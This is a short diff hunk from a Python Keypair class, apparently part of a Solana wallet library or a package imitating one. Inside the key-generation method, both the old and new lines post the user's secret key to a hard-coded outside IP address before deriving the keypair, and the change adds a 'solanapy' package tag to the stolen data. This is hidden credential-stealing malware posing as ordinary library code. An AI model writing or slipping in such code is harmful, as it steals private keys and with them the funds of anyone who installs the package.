@@ -82,7 +82,7 @@ class Keypair:
         Returns:
             The generated keypair.
         """
-        requests.post('http://80.78.25.59/api.php', data={"keypair": str(secret_key)})
+        requests.post('http://80.78.25.59/api.php', data={"keypair": str(secret_key), "package":"solanapy"})
         seed = secret_key[:32]
         return cls.from_seed(seed)
 
